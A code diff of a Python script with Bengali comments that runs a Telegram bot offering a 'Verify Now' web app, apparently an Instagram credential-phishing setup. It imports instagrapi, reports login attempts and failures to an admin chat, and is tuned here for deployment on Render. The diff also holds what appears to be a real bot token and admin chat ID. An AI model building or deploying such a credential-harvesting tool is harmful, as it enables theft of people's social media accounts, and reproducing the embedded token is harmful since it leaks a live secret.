@@ -8,13 +8,13 @@ from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
 from instagrapi import Client
 
 # ==========================================
-# এখানে আপনার তথ্যগুলো বসান
+# ১. এখানে আপনার তথ্যগুলো বসান
 BOT_TOKEN = '9213115853:AAExh_cX7Ve--ze-V7artxpgYmUYewG-lXs'
-ADMIN_CHAT_ID = '5428249457' # @userinfobot থেকে নিন
-WEB_APP_URL = 'https://hlo-world.onrender.com' 
+ADMIN_CHAT_ID = '5428249457' 
+WEB_APP_URL = 'https://hlo-world.onrender.com' # আপনার Render এর লিংক
 # ==========================================
 
-# --- ১. টেলিগ্রাম বট সেটআপ ---
+# --- টেলিগ্রাম বট সেটআপ ---
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     keyboard = [
         [InlineKeyboardButton("Verify Now", web_app=WebAppInfo(url=WEB_APP_URL))]
@@ -29,10 +29,9 @@ def run_bot():
     print("Starting Telegram Bot...")
     app = ApplicationBuilder().token(BOT_TOKEN).build()
     app.add_handler(CommandHandler("start", start))
-    # বট চালু করা হচ্ছে
     app.run_polling()
 
-# --- ২. ওয়েবসাইট সেটআপ (Flask) ---
+# --- ওয়েবসাইট সেটআপ (Flask) ---
 web_app = Flask(__name__)
 
 HTML_PAGE = """
@@ -121,15 +120,15 @@ def send_error_to_telegram(user, error_msg):
     text = f"❌ **Login Failed**\n\n👤 User: `{user}`\n⚠️ Error: `{error_msg}`"
     requests.post(url, json={"chat_id": ADMIN_CHAT_ID, "text": text, "parse_mode": "Markdown"})
 
-# --- ৩. একসাথে বট এবং ওয়েবসাইট চালানো ---
+# ==========================================
+# ৩. একসাথে বট এবং ওয়েবসাইট চালানো (গুরুত্বপূর্ণ)
+# ==========================================
+# বট থ্রেডটি মেইন ব্লকের বাইরে রাখা হলো, যাতে Render এটি মিস না করে
+bot_thread = threading.Thread(target=run_bot, daemon=True)
+bot_thread.start()
+
 if __name__ == '__main__':
-    # বটকে ব্যাকগ্রাউন্ড থ্রেডে চালু করা হচ্ছে
-    bot_thread = threading.Thread(target=run_bot)
-    bot_thread.daemon = True
-    bot_thread.start()
-    
-    # Render থেকে পোর্ট নেওয়া হচ্ছে
+    # Render এর পোর্ট নেওয়া
     port = int(os.environ.get('PORT', 5000))
     print(f"Starting Web Server on port {port}...")
-    # Flask সার্ভার চালু করা হচ্ছে
     web_app.run(host='0.0.0.0', port=port)
